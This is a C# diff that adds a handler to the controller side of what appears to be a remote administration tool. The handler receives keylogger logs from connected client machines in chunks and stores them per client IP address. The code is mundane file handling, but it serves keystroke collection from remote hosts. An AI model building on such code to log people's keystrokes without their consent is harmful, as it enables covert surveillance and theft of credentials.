@@ -315,6 +315,34 @@ namespace xServer.Core.Commands
 			}).Start();
 		}
 
+		public static void HandleGetLogsResponse(Client client, GetLogsResponse packet)
+		{
+			string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\");
+
+			if (!Directory.Exists(downloadPath))
+				Directory.CreateDirectory(downloadPath);
+
+			downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");
+
+			if (client.Value.FrmKl == null)
+			{
+				return;
+			}
+
+			FileSplit destFile = new FileSplit(downloadPath);
+
+			destFile.AppendBlock(packet.Block, packet.CurrentBlock);
+
+			if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
+			{
+				client.Value.FrmKl.Invoke((MethodInvoker)delegate
+				{
+					if (packet.Index == packet.FileCount || packet.FileCount == 0)
+						client.Value.FrmKl.btnGetLogs.Enabled = true;
+				});
+			}
+		}
+
 		public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
 		{
 			string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
